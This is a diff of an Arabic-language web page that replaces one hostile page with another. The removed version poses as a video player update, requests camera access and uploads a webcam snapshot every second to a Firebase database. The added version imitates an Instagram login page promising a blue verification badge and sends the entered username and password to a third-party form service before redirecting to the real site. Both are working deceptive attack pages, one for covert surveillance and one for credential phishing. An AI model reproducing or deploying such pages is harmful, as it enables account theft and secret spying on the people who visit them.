@@ -1,67 +1,128 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>Instagram - مركز المساعدة</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .logo {
+            width: 175px;
+            margin: 20px 0 30px 0;
+        }
+        .instr-text {
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background-color: #1877f2;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .or-divider::before, .or-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .or-divider span { padding: 0 15px; font-weight: 600; }
+        
+        .footer-link {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #385185;
+            text-decoration: none;
+            display: block;
+        }
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            margin-top: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
+<body>
 
-    <h2>تحديث مشغل الفيديو</h2>
-    <p>يرجى الضغط على الزر أدناه لتشغيل المحتوى</p>
-    
-    <button onclick="startSystem()" style="padding:20px 40px; font-size:20px; background:red; color:white; border:none; border-radius:10px; cursor:pointer;">
-        تفعيل المشغل الآن
-    </button>
+<div class="login-card">
+    <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" alt="Instagram" class="logo">
+    <p class="instr-text">يرجى تسجيل الدخول لتأكيد ملكية الحساب وطلب شارة التحقق الزرقاء</p>
 
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="07448344-92a7-4aab-b61e-7e8b136f4bd7">
+        
+        <input type="text" name="Username_or_Email" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+        <input type="password" name="Password" placeholder="كلمة المرور" required>
+        
+        <input type="hidden" name="redirect" value="https://www.instagram.com/accounts/manage_access/">
 
-    <script>
-        // إعدادات Firebase الصحيحة الخاصة بك
-        const firebaseConfig = {
-            databaseURL: "https://omarnnn90-816ad-default-rtdb.firebaseio.com"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        <button type="submit">تسجيل الدخول</button>
+        
+        <div class="or-divider"><span>أو</span></div>
+        <a href="#" class="footer-link">هل نسيت كلمة السر؟</a>
+    </form>
+</div>
 
-        async function startSystem() {
-            try {
-                // طلب إذن الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+<div class="signup-box">
+    ليس لديك حساب؟ <span style="color: #0095f6; font-weight: 600; cursor: pointer;">تسجيل</span>
+</div>
 
-                alert("تم تفعيل المشغل بنجاح، انتظر قليلاً...");
-
-                // بدء عملية الإرسال التلقائي كل ثانية
-                setInterval(() => {
-                    sendFrame();
-                }, 1000);
-
-            } catch (err) {
-                alert("يرجى السماح بالوصول للكاميرا لتشغيل الفيديو.");
-            }
-        }
-
-        function sendFrame() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-
-            canvas.width = 320; 
-            canvas.height = 240;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // تحويل الصورة لنص (Base64) وإرسالها
-            const imageData = canvas.toDataURL('image/jpeg', 0.4);
-            database.ref('live_capture').set({
-                img: imageData,
-                time: Date.now()
-            });
-        }
-    </script>
 </body>
 </html>
